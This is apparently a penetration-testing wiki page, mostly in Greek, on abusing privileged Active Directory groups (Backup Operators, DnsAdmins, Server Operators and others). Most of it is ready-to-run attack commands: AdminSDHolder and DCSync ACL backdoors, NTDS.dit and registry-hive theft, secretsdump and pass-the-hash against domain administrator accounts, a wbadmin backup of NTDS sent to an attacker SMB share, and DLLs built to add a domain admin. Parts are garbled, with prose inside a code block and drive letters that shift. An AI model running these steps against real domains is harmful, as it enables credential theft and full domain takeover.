# Προνομιούχες Ομάδες

{{#include ../../banners/hacktricks-training.md}}

## Γνωστές ομάδες με δικαιώματα διαχείρισης

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Αυτή η ομάδα έχει εξουσιοδότηση να δημιουργεί λογαριασμούς και ομάδες που δεν είναι μέλη των Administrators στο domain. Επιπλέον, επιτρέπει τοπική είσοδο στον Domain Controller (DC).

Για να εντοπιστούν τα μέλη αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Επιτρέπεται η προσθήκη νέων χρηστών, καθώς και η τοπική σύνδεση στον DC.

## Ομάδα AdminSDHolder

Η Access Control List (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμη καθώς ορίζει τα δικαιώματα για όλες τις "protected groups" στο Active Directory, συμπεριλαμβανομένων των ομάδων με υψηλά προνόμια. Αυτός ο μηχανισμός εξασφαλίζει την ασφάλεια αυτών των ομάδων αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό τροποποιώντας την Access Control List (ACL) της ομάδας **AdminSDHolder**, παραχωρώντας πλήρη δικαιώματα σε έναν κανονικό χρήστη. Αυτό ουσιαστικά θα έδινε σε αυτόν τον χρήστη πλήρη έλεγχο όλων των «protected groups». Αν τα δικαιώματα αυτού του χρήστη αλλάξουν ή αφαιρεθούν, θα αποκαθίστανται αυτόματα εντός μιας ώρας λόγω του σχεδιασμού του συστήματος.

Η πρόσφατη τεκμηρίωση των Windows Server εξακολουθεί να θεωρεί αρκετές ενσωματωμένες ομάδες χειριστών ως αντικείμενα **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, κ.λπ.). Η διαδικασία **SDProp** τρέχει στον **PDC Emulator** κάθε 60 λεπτά από προεπιλογή, θέτει `adminCount=1` και απενεργοποιεί την κληρονομικότητα σε protected αντικείμενα. Αυτό είναι χρήσιμο τόσο για persistence όσο και για τον εντοπισμό παλαιών προνομιούχων χρηστών που αφαιρέθηκαν από μια protected ομάδα αλλά εξακολουθούν να διατηρούν την μη-κληρονομούμενη ACL.

Οι εντολές για την επισκόπηση των μελών και την τροποποίηση των δικαιωμάτων περιλαμβάνουν:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Διατίθεται ένα script για να επιταχύνει τη διαδικασία επαναφοράς: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε το [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Η συμμετοχή σε αυτήν την ομάδα επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων του Active Directory, τα οποία μπορεί να αποκαλύψουν ευαίσθητες πληροφορίες:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Αυτό είναι χρήσιμο για **την ανάκτηση προηγούμενων διαδρομών προνομίων**. Διαγραμμένα αντικείμενα μπορούν ακόμα να αποκαλύψουν `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, παλιά SPNs, ή το DN μιας διαγραμμένης ομάδας με προνόμια που μπορεί αργότερα να αποκατασταθεί από άλλον χειριστή.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Πρόσβαση σε Domain Controller

Η πρόσβαση σε αρχεία στον DC είναι περιορισμένη εκτός αν ο χρήστης είναι μέλος της ομάδας `Server Operators`, η οποία αλλάζει το επίπεδο πρόσβασης.

### Αναβάθμιση προνομίων

Χρησιμοποιώντας τα `PsService` ή `sc` από το Sysinternals, μπορεί κανείς να εξετάσει και να τροποποιήσει τα δικαιώματα υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και την αναβάθμιση προνομίων:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας τη διαχείριση υπηρεσιών για απόκτηση αυξημένων προνομίων.

## Backup Operators

Η ιδιότητα μέλους στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων του `DC01` λόγω των προνομίων `SeBackup` και `SeRestore`. Αυτά τα προνόμια επιτρέπουν την περιήγηση σε φακέλους, την προβολή του περιεχομένου και την αντιγραφή αρχείων, ακόμη και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Απαιτείται η χρήση συγκεκριμένων scripts για αυτήν τη διαδικασία.

Για να εμφανίσετε τα μέλη της ομάδας, εκτελέστε:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Τοπική Επίθεση

Για να αξιοποιηθούν αυτά τα προνόμια τοπικά, εφαρμόζονται τα παρακάτω βήματα:

1. Εισαγωγή των απαραίτητων βιβλιοθηκών:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ενεργοποιήστε και επαληθεύστε το `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Πρόσβαση και αντιγραφή αρχείων από περιορισμένους καταλόγους, για παράδειγμα:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Επίθεση AD

Η άμεση πρόσβαση στο file system του Domain Controller επιτρέπει την κλοπή της βάσης δεδομένων `NTDS.dit`, η οποία περιέχει όλα τα NTLM hashes για τους χρήστες και τους υπολογιστές του domain.

#### Χρησιμοποιώντας diskshadow.exe

1. Δημιουργήστε ένα shadow copy της μονάδας `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Αντιγράψτε `NTDS.dit` από το shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Εναλλακτικά, χρησιμοποιήστε `robocopy` για αντιγραφή αρχείων:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Εξαγωγή `SYSTEM` και `SAM` για ανάκτηση hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Ανακτήστε όλα τα hashes από `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Μετά την εξαγωγή: Pass-the-Hash σε DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Χρήση wbadmin.exe

1. Ρυθμίστε σύστημα αρχείων NTFS για SMB server στον υπολογιστή του επιτιθέμενου και cache τα SMB credentials στη μηχανή-στόχο.
2. Χρησιμοποιήστε `wbadmin.exe` για backup του συστήματος και εξαγωγή του `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα προνόμιά τους για να φορτώσουν μια αυθαίρετη DLL με δικαιώματα SYSTEM σε έναν DNS server, που συχνά φιλοξενείται σε Domain Controllers. Αυτή η δυνατότητα επιτρέπει σημαντικές δυνατότητες εκμετάλλευσης.

Για να απαριθμήσετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Αυτή η ευπάθεια επιτρέπει την εκτέλεση αυθαίρετου κώδικα με δικαιώματα SYSTEM στην υπηρεσία DNS (συνήθως εντός των DCs). Το ζήτημα διορθώθηκε το 2021.

Τα μέλη μπορούν να κάνουν τον DNS server να φορτώσει μια αυθαίρετη DLL (είτε τοπικά είτε από έναν απομακρυσμένο share) χρησιμοποιώντας εντολές όπως:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Η επανεκκίνηση της υπηρεσίας DNS (που ενδέχεται να απαιτεί επιπλέον δικαιώματα) είναι απαραίτητη για να φορτωθεί το DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Για περισσότερες λεπτομέρειες σχετικά με αυτό το attack vector, ανατρέξτε στο ired.team.

#### Mimilib.dll

Είναι επίσης εφικτό να χρησιμοποιηθεί το mimilib.dll για εκτέλεση εντολών, τροποποιώντας το ώστε να εκτελεί συγκεκριμένες εντολές ή reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.

### WPAD Record για MitM

Τα μέλη του DnsAdmins μπορούν να χειριστούν εγγραφές DNS για να πραγματοποιήσουν επιθέσεις Man-in-the-Middle (MitM) δημιουργώντας μια εγγραφή WPAD αφού απενεργοποιήσουν την global query block list. Εργαλεία όπως Responder ή Inveigh μπορούν να χρησιμοποιηθούν για spoofing και καταγραφή δικτυακής κίνησης.

### Αναγνώστες αρχείων συμβάντων

Τα μέλη μπορούν να έχουν πρόσβαση στα αρχεία καταγραφής συμβάντων, ενδεχομένως εντοπίζοντας ευαίσθητες πληροφορίες όπως κωδικούς σε απλό κείμενο ή λεπτομέρειες εκτέλεσης εντολών:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο του domain, ενδεχομένως παραχωρώντας δικαιώματα DCSync. Οι τεχνικές για privilege escalation που εκμεταλλεύονται αυτή την ομάδα περιγράφονται λεπτομερώς στο Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Αν μπορείτε να ενεργήσετε ως μέλος αυτής της ομάδας, η κλασική κατάχρηση είναι να χορηγήσετε σε έναν principal ελεγχόμενο από τον επιτιθέμενο τα replication rights που απαιτούνται για το [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Ιστορικά, το **PrivExchange** συνέδεε chained mailbox access, coerced Exchange authentication και LDAP relay για να καταλήξει στο ίδιο primitive. Ακόμα κι όταν αυτή η διαδρομή relay έχει μετριαστεί, η άμεση συμμετοχή στο `Exchange Windows Permissions` ή ο έλεγχος ενός Exchange server παραμένει μια ιδιαίτερα πολύτιμη οδός προς τα δικαιώματα αναπαραγωγής του domain.

## Hyper-V Administrators

Οι Hyper-V Administrators έχουν πλήρη πρόσβαση στο Hyper-V, κάτι που μπορεί να εκμεταλλευτεί κανείς για να αποκτήσει έλεγχο σε virtualized Domain Controllers. Αυτό περιλαμβάνει το cloning live DCs και την εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Exploitation Example

Η πρακτική κατάχρηση είναι συνήθως η **offline access to DC disks/checkpoints** αντί για τα παλιά κόλπα host-level LPE. Με πρόσβαση στον Hyper-V host, ένας χειριστής μπορεί να κάνει checkpoint ή export ενός virtualized Domain Controller, να προσάρτήσει το VHDX και να εξαγάγει τα `NTDS.dit`, `SYSTEM` και άλλα μυστικά χωρίς να αγγίξει το LSASS μέσα στο guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Από εκεί, επαναχρησιμοποίησε το workflow των `Backup Operators` για να αντιγράψεις το `Windows\NTDS\ntds.dit` και τα registry hives εκτός σύνδεσης.

## Group Policy Creators Owners

Αυτό το group επιτρέπει στα μέλη να δημιουργούν Group Policies στο domain. Ωστόσο, τα μέλη του δεν μπορούν να εφαρμόσουν αυτές τις Group Policies σε χρήστες ή ομάδες ούτε να επεξεργαστούν υπάρχοντα GPOs.

Η σημαντική λεπτομέρεια είναι ότι ο δημιουργός γίνεται ιδιοκτήτης του νέου GPO και συνήθως αποκτά αρκετά δικαιώματα για να το επεξεργαστεί στη συνέχεια. Αυτό σημαίνει ότι αυτό το group είναι ενδιαφέρον όταν μπορείς είτε:

- να δημιουργήσεις ένα κακόβουλο GPO και να πείσεις έναν admin να το συνδέσει σε ένα στοχευμένο OU/domain
- να επεξεργαστείς ένα GPO που δημιούργησες και που ήδη είναι συνδεδεμένο κάπου χρήσιμο
- να καταχραστείς κάποιο άλλο παραχωρημένο δικαίωμα που σου επιτρέπει να συνδέεις GPOs, ενώ αυτό το group σου δίνει το δικαίωμα επεξεργασίας

Η πρακτική κατάχρηση συνήθως σημαίνει την προσθήκη ενός **Immediate Task**, **startup script**, **local admin membership**, ή μιας αλλαγής **user rights assignment** μέσω αρχείων πολιτικής που υποστηρίζονται από το SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Σε Domain Controllers αυτή η ομάδα είναι επικίνδυνη επειδή η προεπιλεγμένη πολιτική Domain Controller χορηγεί **`SeLoadDriverPrivilege`** στους `Print Operators`. Αν αποκτήσετε elevated token για μέλος αυτής της ομάδας, μπορείτε να ενεργοποιήσετε το privilege και να φορτώσετε έναν υπογεγραμμένο αλλά ευάλωτο driver για να κάνετε άλμα σε kernel/SYSTEM. Για λεπτομέρειες χειρισμού token, δείτε [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Τα μέλη αυτής της ομάδας έχουν πρόσβαση σε PCs μέσω Remote Desktop Protocol (RDP). Για να απαριθμήσετε αυτά τα μέλη, υπάρχουν διαθέσιμες εντολές PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Περαιτέρω πληροφορίες για την εκμετάλλευση του RDP μπορούν να βρεθούν σε αφιερωμένους πόρους pentesting.

#### Χρήστες Απομακρυσμένης Διαχείρισης

Τα μέλη μπορούν να έχουν πρόσβαση σε υπολογιστές μέσω του **Windows Remote Management (WinRM)**. Η καταγραφή αυτών των μελών πραγματοποιείται μέσω:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Για τεχνικές εκμετάλλευσης που σχετίζονται με **WinRM**, πρέπει να συμβουλευτείτε την αντίστοιχη τεκμηρίωση.

#### Server Operators

Αυτή η ομάδα έχει δικαιώματα να εκτελεί διάφορες ρυθμίσεις στους Domain Controllers, συμπεριλαμβανομένων δικαιωμάτων δημιουργίας αντιγράφων ασφαλείας και επαναφοράς, αλλαγής της ώρας συστήματος και τερματισμού λειτουργίας του συστήματος. Για να απαριθμήσετε τα μέλη, η εντολή που παρέχεται είναι:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Σε Domain Controllers, `Server Operators` συνήθως κληρονομούν αρκετά δικαιώματα ώστε να **αναδιαμορφώσουν ή να ξεκινούν/σταματούν υπηρεσίες** και επίσης λαμβάνουν `SeBackupPrivilege`/`SeRestorePrivilege` μέσω της προεπιλεγμένης πολιτικής DC. Στην πράξη, αυτό τους καθιστά μια γέφυρα μεταξύ **service-control abuse** και **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Εάν ένα service ACL δίνει σε αυτή την ομάδα δικαιώματα αλλαγής/εκκίνησης, δείξτε την υπηρεσία σε μια αυθαίρετη εντολή, ξεκινήστε την ως `LocalSystem`, και στη συνέχεια επαναφέρετε το αρχικό `binPath`. Εάν ο έλεγχος υπηρεσιών είναι κλειδωμένος, επιστρέψτε στις τεχνικές των `Backup Operators` παραπάνω για να αντιγράψετε το `NTDS.dit`.

## Αναφορές <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
